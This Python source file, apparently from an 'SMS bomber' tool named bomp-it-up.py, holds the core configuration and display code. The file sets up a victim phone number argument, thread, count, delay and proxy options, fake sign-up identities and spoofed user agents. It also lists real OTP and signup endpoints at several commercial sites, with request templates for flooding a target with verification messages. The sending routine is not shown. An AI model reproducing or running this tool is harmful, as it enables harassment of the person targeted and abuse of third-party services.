#!/bin/env python3


R = "\u001b[31m"
G = "\u001b[32m"
Y = "\u001b[33m"
B = "\u001b[34m"
S = "\u001b[36m"
N = "\u001b[0m"
CORE = {
        "LIST":{
            "MAILS":[
                "casca1244@gmail.com",
                "boba4523@gmail.com",
                "iurhyo442376@gmail.com",
                "wgtriw77654ygfus@gmail.com",
                "yugwduywg@gmail.com"
                ],
            "NAMES":[
                "eygrodfhs",
                "fiygefui",
                "oruhiueh",
                "fuyegoue",
                "dukwygfuiwh"
                ],
            "PASS":[
                "wyetfdwe21@#$",
                "kydfgsdi36543&*",
                "ydfi3651243%$$",
                "JUTYF%$#$E2121"
                ],
            "AGENT":[
                "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
                ],
            "XAGENT":[
                "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 FKUA/website/42/website/Desktop"
                ],
            "ARGS":["-c", "--code", "-p", "--proxy", "-m", "--message", "-v", "--victom", "-d", "--delay", "-t", "--thread"]
            },
        "VERSION": "v0.0.1",
        "SITE": {
            "NAME":{
                "FLIPCART": {
                    "ONLY": "",
                    "METHOD":"POST",
                    "URL": "https://www.flipkart.com/api/5/user/otp/generate",
                    "DATA": "{\"loginId\":\"+@CODE@VICT\"}",
                    "HEADER": '{"x-user-agent":"@XAGENT","Origin":"https://www.flipkart.com","Content-Type":"application/x-www-form-urlencoded","User-Agent":"@AGENT"}',
                    "REPLY": ""
                    },
                "HOUSSING": {
                    "ONLY": "91",
                    "METHOD": "POST",
                    "URL": "https://login.housing.com/api/v2/send-otp",
                    "DATA": '{"phone": "@VICT"}',
                    "HEADER": '{"User-Agent":"@AGENT"}',
                    "REPLY": '{"message":"OTP Sent","response_code":1}'
                    },
                "AJIO": {
                    "ONLY": "91",
                    "METHOD": "POST",
                    "URL": "https://login.web.ajio.com/api/auth/signupSendOTP",
                    "DATA": '{"firstName":"@NAME","login":"@MAIL","password":"@PASS","genderType":"Male","mobileNumber":"@VICT","requestsType":"SENDOTP"}',
                    "HEADER": '{"User-Agent":"@AGENT"}',
                    "REPLY": '{"expires_in":0,"statusCode":"1"}'
                    },
                "UNACADEMY": {
                    "ONLY": "91",
                    "METHOD": "POST",
                    "URL": "https://unacademy.com/api/v1/user/get_app_link/",
                    "DATA": '{"phone": "@VICT"}',
                    "HEADER": '{"User-Agent":"@AGENT"}',
                    "REPLY": '{"message":"A link to the app has been sent to you.","success_code":"S1706"}'
                    },
                "YOULA": {
                    "ONLY": "",
                    "METHOD": "POST",
                    "URL": "https://youla.ru/web-api/auth/request_code",
                    "DATA": '{"phone":"+@CODE@VICT"}',
                    "HEADER": '{"User-Agent":"@AGENT"}',
                    "REPLY": ""
                    },
                "SECUREDAPI": {
                    "ONLY": "91",
                    "METHOD": "GET",
                    "URL": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=@VICT",
                    "REPLY": "false"
                    }
                }
            },
        "HELP": """
USAGE:  bomp-it-up.py <arg>
ARGS:
    -m  --message   Number of message (Default: 20)
    -v  --victom    Phone Number
    -t  --thread    Number of thread(Parallelism) (Default: 10)
    -d  --delay     Time to delay (Default: 1)
    -p  --proxy     Specify proxy (Default: None)
    -c  --code      Specify Country code (With out '+')(Default: 91)
EG:
    bomp-it-up.py -v xxxxxxxxx -c 91 -t 21 -m 50
    bomp-it-up.py -v xxxxxxxxx -c 91 -t 30 -d 2 -m 100"""
        }



def Initial_print(vict, code, thread, count, delay):
    print("""╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱
╱╱╱╱╱╱╭━━╮╱╱╱╱╱╱╱╱╱╱╭━━┳╮╱╭╮╱╭╮╱╱╱╱╱╱╱╱╱╱
╱╱╱╱╱╱┃╭╮┃╱╱╱╱╱╱╱╱╱╱╰┫┣╯╰╮┃┃╱┃┃╱╱╱╱╱╱╱╱╱╱
╱╱╱╱╱╱┃╰╯╰┳━━┳╮╭┳━━╮╱┃┣╮╭╯┃┃╱┃┣━━╮╱╱╱╱╱╱╱
╱╱╱╱╱╱┃╭━╮┃╭╮┃╰╯┃╭╮┃╱┃┃┃┃╱┃┃╱┃┃╭╮┃╱╱╱╱╱╱╱
╱╱╱╱╱╱┃╰━╯┃╰╯┃┃┃┃╰╯┃╭┫┣┫╰╮┃╰━╯┃╰╯┃╱╱╱╱╱╱╱
╱╱╱╱╱╱╰━━━┻━━┻┻┻┫╭━╯╰━━┻━╯╰━━━┫╭━╯╱╱╱╱╱╱╱
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱@R5C╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱
-----------------------------------------
{R}TARGET{N} --> {v}
{R}CODE{N} --> +{c}
{R}THREAD{N} --> {t}
{R}No.Of.MESSAGE{N} --> {n}
{R}DELAY{N} --> {d}
-----------------------------------------
   SUCESS       FAIL       STAT
-----------------------------------------""".format(V=CORE["VERSION"],R=R,N=N,Y=Y,v = vict,t = thread,c = code,n=count,d = delay))
    return

def Print(sucess, fail, count, total):
    print("\r{:^13}{:^12}  {}/{}      ".format(sucess,fail,count,total),end="")


